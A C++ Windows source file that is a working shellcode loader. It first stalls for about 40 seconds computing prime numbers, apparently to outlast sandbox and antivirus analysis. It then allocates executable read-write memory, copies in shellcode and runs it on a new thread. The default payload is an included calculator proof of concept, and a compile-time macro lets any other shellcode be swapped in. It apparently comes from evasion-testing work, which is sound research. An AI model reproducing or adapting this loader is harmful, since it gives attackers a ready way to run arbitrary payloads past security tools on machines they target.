#include <windows.h>
#include <vector>
#include <iostream>


int get_largest_prime_number(int end_number)
{
    std::vector<int> test_sequence {2};

    for (int start_number = 3; start_number <= end_number; start_number++)
    {
        bool is_prime = true;
        for (int n : test_sequence)
            if (start_number % n == 0 && start_number != n)
                is_prime = false;

        if (is_prime)
            test_sequence.push_back(start_number);
    }

    int largest_prime_number = test_sequence.back();

    test_sequence.clear();

#if DEBUG
	printf("Prime number computed : %d\n", largest_prime_number);
	printf("Hit enter to continue\n");
	getchar();
#endif

    return largest_prime_number;
}

int main()
{

#ifdef SHELLCODE_PATH
#include SHELLCODE_PATH
#else
#include "../../src/shellcodes/calc.hpp"
#endif

    // Step 1 : Calculate the largest prime number (before a specific number)
    // About 40 seconds on 11th Gen i5 4 Cores
    int end_number = 500000;
    int largest_prime_number = get_largest_prime_number(end_number);

#if DEBUG
	printf("Shellcode is located at %p\n", shellcode);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 2 : Allocate the memory
	void* memory = VirtualAlloc(nullptr,
								sizeof(shellcode),
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);

	if (memory == nullptr)
	{
		return 1;
	}

#if DEBUG
	printf("Allocated memory at %p\n", memory);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 3 : Copy the shellcode to the allocated memory
	memcpy(memory,
		   shellcode,
		   sizeof(shellcode));

#if DEBUG
	printf("Shellcode copied to memory\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 4 : Create a thread pointing to the shellcode address
	HANDLE thread =	CreateThread(nullptr,
				 0,
				 (LPTHREAD_START_ROUTINE) memory,
				 nullptr,
				 0,
				 nullptr);

	if (thread == nullptr)
	{
		return 1;
	}

	// Wait for the thread to finish
	WaitForSingleObject(thread, INFINITE);

	return 0;
}
